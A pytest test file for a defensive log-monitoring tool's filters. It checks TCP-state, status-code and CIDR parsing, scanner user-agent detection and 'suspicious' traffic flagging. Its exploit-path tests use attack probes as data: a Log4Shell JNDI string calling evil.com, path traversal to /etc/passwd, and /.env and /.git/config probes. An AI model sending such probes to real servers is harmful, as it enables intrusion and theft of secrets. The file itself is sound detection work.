"""Tests for nethergaze.filters."""

from __future__ import annotations

from datetime import datetime, timezone


from nethergaze.filters import (
    FilterState,
    has_exploit_path,
    has_scanner_ua,
    parse_cidr_list,
    parse_status_code_spec,
    parse_tcp_states,
)
from nethergaze.models import Connection, IPProfile, LogEntry, TCPState


# --- Helpers ---


def _make_profile(
    ip: str = "1.2.3.4",
    connections: list[Connection] | None = None,
    total_requests: int = 0,
    request_rate: float = 0.0,
    org: str = "?",
    user_agent: str = "",
) -> IPProfile:
    profile = IPProfile(ip=ip)
    if connections:
        profile.connections = connections
    profile.total_requests = total_requests
    profile.request_rate_per_min = request_rate
    if user_agent:
        entry = LogEntry(
            remote_ip=ip,
            timestamp=datetime.now(timezone.utc),
            method="GET",
            path="/",
            protocol="HTTP/1.1",
            status_code=200,
            bytes_sent=0,
            referrer="-",
            user_agent=user_agent,
        )
        profile.log_entries.append(entry)
    return profile


def _make_conn(
    ip: str = "1.2.3.4", state: TCPState = TCPState.ESTABLISHED
) -> Connection:
    return Connection(
        local_ip="0.0.0.0",
        local_port=443,
        remote_ip=ip,
        remote_port=12345,
        state=state,
        inode=0,
    )


def _make_entry(
    ip: str = "1.2.3.4",
    status: int = 200,
    method: str = "GET",
    path: str = "/",
) -> LogEntry:
    return LogEntry(
        remote_ip=ip,
        timestamp=datetime.now(timezone.utc),
        method=method,
        path=path,
        protocol="HTTP/1.1",
        status_code=status,
        bytes_sent=100,
        referrer="-",
        user_agent="Mozilla/5.0",
    )


# --- parse_tcp_states ---


class TestParseTcpStates:
    def test_single(self):
        result = parse_tcp_states("SYN_RECV")
        assert result == {TCPState.SYN_RECV}

    def test_multiple(self):
        result = parse_tcp_states("SYN_RECV,ESTABLISHED")
        assert result == {TCPState.SYN_RECV, TCPState.ESTABLISHED}

    def test_empty(self):
        assert parse_tcp_states("") is None
        assert parse_tcp_states("   ") is None

    def test_invalid(self):
        assert parse_tcp_states("BOGUS") is None

    def test_mixed_valid_invalid(self):
        result = parse_tcp_states("ESTABLISHED,BOGUS")
        assert result == {TCPState.ESTABLISHED}


# --- parse_status_code_spec ---


class TestParseStatusCodeSpec:
    def test_shorthand(self):
        result = parse_status_code_spec("4xx")
        assert result == [(400, 499)]

    def test_multiple_shorthand(self):
        result = parse_status_code_spec("4xx,5xx")
        assert result == [(400, 499), (500, 599)]

    def test_range(self):
        result = parse_status_code_spec("400-404")
        assert result == [(400, 404)]

    def test_single_code(self):
        result = parse_status_code_spec("200")
        assert result == [(200, 200)]

    def test_empty(self):
        assert parse_status_code_spec("") is None
        assert parse_status_code_spec("   ") is None


# --- parse_cidr_list ---


class TestParseCidrList:
    def test_valid(self):
        nets = parse_cidr_list(["10.0.0.0/8", "192.168.0.0/16"])
        assert len(nets) == 2

    def test_invalid_skipped(self):
        nets = parse_cidr_list(["10.0.0.0/8", "not-a-cidr", "192.168.0.0/16"])
        assert len(nets) == 2

    def test_empty(self):
        assert parse_cidr_list([]) == []


# --- has_scanner_ua ---


class TestScannerUA:
    def test_zgrab(self):
        assert has_scanner_ua("Mozilla/5.0 zgrab/0.x")

    def test_nmap(self):
        assert has_scanner_ua("Nmap Scripting Engine")

    def test_normal_browser(self):
        assert not has_scanner_ua("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")


# --- FilterState.matches_profile ---


class TestFilterStateProfile:
    def test_no_filter_passes_all(self):
        f = FilterState()
        assert not f.is_active
        profile = _make_profile()
        assert f.matches_profile(profile)

    def test_tcp_state_filter(self):
        f = FilterState(tcp_states={TCPState.SYN_RECV})
        syn = _make_profile(connections=[_make_conn(state=TCPState.SYN_RECV)])
        est = _make_profile(connections=[_make_conn(state=TCPState.ESTABLISHED)])
        assert f.matches_profile(syn)
        assert not f.matches_profile(est)

    def test_request_rate_filter(self):
        f = FilterState(min_request_rate=10.0)
        slow = _make_profile(request_rate=5.0)
        fast = _make_profile(request_rate=15.0)
        assert not f.matches_profile(slow)
        assert f.matches_profile(fast)

    def test_text_filter(self):
        f = FilterState(text_filter="telecom")
        # as_org falls back to whois network_name, default is "?"
        p = _make_profile(ip="1.2.3.4")
        assert not f.matches_profile(p)

    def test_cidr_deny(self):
        nets = parse_cidr_list(["10.0.0.0/8"])
        f = FilterState(cidr_deny=nets)
        inside = _make_profile(ip="10.1.2.3")
        outside = _make_profile(ip="8.8.8.8")
        assert not f.matches_profile(inside)
        assert f.matches_profile(outside)

    def test_cidr_allow(self):
        nets = parse_cidr_list(["192.168.0.0/16"])
        f = FilterState(cidr_allow=nets)
        inside = _make_profile(ip="192.168.1.1")
        outside = _make_profile(ip="8.8.8.8")
        assert f.matches_profile(inside)
        assert not f.matches_profile(outside)


# --- FilterState.matches_log_entry ---


class TestFilterStateLogEntry:
    def test_status_code_filter(self):
        f = FilterState(status_codes=[(400, 499)])
        ok = _make_entry(status=200)
        not_found = _make_entry(status=404)
        assert not f.matches_log_entry(ok)
        assert f.matches_log_entry(not_found)

    def test_text_filter_log(self):
        f = FilterState(text_filter="api")
        api = _make_entry(path="/api/data")
        home = _make_entry(path="/index.html")
        assert f.matches_log_entry(api)
        assert not f.matches_log_entry(home)

    def test_cidr_deny_log(self):
        nets = parse_cidr_list(["10.0.0.0/8"])
        f = FilterState(cidr_deny=nets)
        priv = _make_entry(ip="10.1.2.3")
        pub = _make_entry(ip="8.8.8.8")
        assert not f.matches_log_entry(priv)
        assert f.matches_log_entry(pub)


# --- Suspicious mode ---


class TestSuspiciousMode:
    def test_syn_recv_no_requests(self):
        f = FilterState(suspicious_mode=True)
        p = _make_profile(
            connections=[_make_conn(state=TCPState.SYN_RECV)],
            total_requests=0,
        )
        assert f.matches_profile(p)

    def test_high_conns_low_requests(self):
        f = FilterState(suspicious_mode=True, suspicious_min_conns=3)
        conns = [_make_conn() for _ in range(5)]
        p = _make_profile(connections=conns, total_requests=0)
        assert f.matches_profile(p)

    def test_burst_rate(self):
        f = FilterState(suspicious_mode=True, suspicious_burst_rpm=50)
        p = _make_profile(request_rate=100)
        assert f.matches_profile(p)

    def test_scanner_ua(self):
        f = FilterState(suspicious_mode=True)
        p = _make_profile(user_agent="zgrab/0.x")
        assert f.matches_profile(p)

    def test_normal_traffic_not_suspicious(self):
        f = FilterState(suspicious_mode=True)
        p = _make_profile(
            connections=[_make_conn()],
            total_requests=10,
            request_rate=5.0,
            user_agent="Mozilla/5.0",
        )
        assert not f.matches_profile(p)


# --- describe ---


class TestDescribe:
    def test_empty(self):
        assert FilterState().describe() == ""

    def test_suspicious(self):
        assert FilterState(suspicious_mode=True).describe() == "SUSPICIOUS"

    def test_combined(self):
        f = FilterState(
            tcp_states={TCPState.SYN_RECV},
            text_filter="test",
        )
        desc = f.describe()
        assert "state:SYN_RECV" in desc
        assert '"test"' in desc


# --- Exploit path detection ---


class TestExploitPathDetection:
    def test_env_probe(self):
        assert has_exploit_path("/.env")

    def test_wp_login(self):
        assert has_exploit_path("/wp-login.php")

    def test_wp_admin(self):
        assert has_exploit_path("/wp-admin/install.php")

    def test_jndi(self):
        assert has_exploit_path("/${jndi:ldap://evil.com/x}")

    def test_path_traversal(self):
        assert has_exploit_path("/../../etc/passwd")

    def test_etc_passwd(self):
        assert has_exploit_path("/etc/passwd")

    def test_git_exposure(self):
        assert has_exploit_path("/.git/config")

    def test_phpmyadmin(self):
        assert has_exploit_path("/phpMyAdmin/index.php")

    def test_cgi_bin(self):
        assert has_exploit_path("/cgi-bin/test.cgi")

    def test_normal_path(self):
        assert not has_exploit_path("/index.html")

    def test_normal_api(self):
        assert not has_exploit_path("/api/v1/users")

    def test_normal_css(self):
        assert not has_exploit_path("/style.css")

    def test_extra_patterns(self):
        import re

        extra = [re.compile(r"/custom-exploit", re.IGNORECASE)]
        assert has_exploit_path("/custom-exploit", extra)
        assert not has_exploit_path("/safe-path", extra)


# --- Suspicious reasons ---


class TestSuspiciousReasons:
    def test_returns_reasons_for_scanner_ua(self):
        f = FilterState(suspicious_mode=True)
        p = _make_profile(user_agent="zgrab/0.x")
        reasons = f.suspicious_reasons(p)
        assert any("scanner UA" in r for r in reasons)

    def test_returns_reasons_for_exploit_path(self):
        f = FilterState(suspicious_mode=True)
        p = _make_profile(ip="1.2.3.4")
        entry = LogEntry(
            remote_ip="1.2.3.4",
            timestamp=datetime.now(timezone.utc),
            method="GET",
            path="/.env",
            protocol="HTTP/1.1",
            status_code=200,
            bytes_sent=0,
            referrer="-",
            user_agent="test",
        )
        p.log_entries.append(entry)
        reasons = f.suspicious_reasons(p)
        assert any("exploit" in r for r in reasons)

    def test_returns_reasons_for_burst_rate(self):
        f = FilterState(suspicious_mode=True, suspicious_burst_rpm=50)
        p = _make_profile(request_rate=100)
        reasons = f.suspicious_reasons(p)
        assert any("burst" in r for r in reasons)

    def test_normal_traffic_no_reasons(self):
        f = FilterState(suspicious_mode=True)
        p = _make_profile(
            connections=[_make_conn()],
            total_requests=10,
            request_rate=5.0,
            user_agent="Mozilla/5.0",
        )
        reasons = f.suspicious_reasons(p)
        assert reasons == []


# --- Suspicious mode exploit path ---


class TestSuspiciousExploitPath:
    def test_exploit_path_triggers_suspicious(self):
        f = FilterState(suspicious_mode=True)
        p = _make_profile(ip="1.2.3.4")
        entry = LogEntry(
            remote_ip="1.2.3.4",
            timestamp=datetime.now(timezone.utc),
            method="GET",
            path="/.env",
            protocol="HTTP/1.1",
            status_code=200,
            bytes_sent=0,
            referrer="-",
            user_agent="test",
        )
        p.log_entries.append(entry)
        assert f.matches_profile(p)

    def test_normal_path_not_suspicious_alone(self):
        f = FilterState(suspicious_mode=True)
        p = _make_profile(ip="1.2.3.4", total_requests=5, request_rate=5.0)
        entry = LogEntry(
            remote_ip="1.2.3.4",
            timestamp=datetime.now(timezone.utc),
            method="GET",
            path="/index.html",
            protocol="HTTP/1.1",
            status_code=200,
            bytes_sent=100,
            referrer="-",
            user_agent="Mozilla/5.0",
        )
        p.log_entries.append(entry)
        assert not f.matches_profile(p)


# --- Auth failure suspicious ---


class TestAuthFailureSuspicious:
    def test_auth_failures_trigger_suspicious(self):
        f = FilterState(suspicious_mode=True, suspicious_min_auth_failures=3)
        p = _make_profile()
        p.total_auth_failures = 5
        assert f.matches_profile(p)

    def test_low_auth_failures_not_suspicious(self):
        f = FilterState(suspicious_mode=True, suspicious_min_auth_failures=3)
        p = _make_profile(
            connections=[_make_conn()],
            total_requests=10,
            request_rate=5.0,
            user_agent="Mozilla/5.0",
        )
        p.total_auth_failures = 1
        assert not f.matches_profile(p)

    def test_auth_failures_in_reasons(self):
        f = FilterState(suspicious_mode=True, suspicious_min_auth_failures=3)
        p = _make_profile()
        p.total_auth_failures = 10
        reasons = f.suspicious_reasons(p)
        assert any("auth failures" in r for r in reasons)
